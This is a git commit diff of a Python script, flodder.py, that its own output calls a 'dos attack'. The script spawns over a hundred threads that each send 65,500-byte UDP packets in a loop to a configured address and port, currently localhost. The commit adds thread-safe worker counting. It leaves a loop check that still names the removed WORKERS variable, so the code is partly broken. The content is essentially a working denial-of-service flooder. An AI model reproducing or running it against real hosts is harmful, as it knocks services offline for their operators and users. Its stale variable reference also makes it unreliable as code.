3b834f474419891daabf67bfc69e6c055f119435
Daniel Robson <10593293@student.bpc.internal>
2017-03-27 13:15:40 +0100

    .

--- flodder.py
+++ flodder.py
@@ -1,20 +1,33 @@
 import socket
 import time
 import thread
+import threading
 udp_id_addr = "127.0.0.1"
 udp_port_no = 21299
 send_buff = "N" * 65500
 send_delay = None
-WORKERS = 240
+worker_count = 128
 sock = None
-
+lock = threading.Lock()
 active_workers = 0
 dos_inprog = 0
+
+def add_wk():
+	global active_workers
+	lock.acquire()
+	active_workers += 1
+	lock.release()
+	
+def rm_rk():
+	global active_workers
+	lock.acquire()
+	active_workers -= 1
+	lock.release()
 
 def worker(wk_id):
 	global active_workers
 	print("worker with the id of %d is now active.\n" % (wk_id))
-	active_workers += 1
+	add_wk()
 	try:
 		while(dos_inprog):
 			sock.sendto(send_buff, (udp_id_addr, udp_port_no))
@@ -22,19 +35,24 @@ def worker(wk_id):
 				time.sleep(send_delay)
 	except Exception:
 		print("theres seems of been an error.\n")
-	active_workers -= 1
+	rm_rk()
 			
 if __name__ == "__main__":
 	dos_inprog = 1
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	for x in range(0, WORKERS):
+	for x in range(0, worker_count):
 		try:
 			thread.start_new_thread(worker, (x,))
 		except:
 			print ("Error: unable to start thread")
-	print("dos attack has started with " + str(WORKERS) + " workers.")
+	print("dos attack has started with " + str(worker_count) + " workers.")
+	print("waiting for all workers.")
+	
 	while(1):
+		print(active_workers)
 		if (active_workers == WORKERS): break
+	print("all workers are avtive.")
+	
 	while(1):
 		if (active_workers == 0): break
 		cmd = input("")
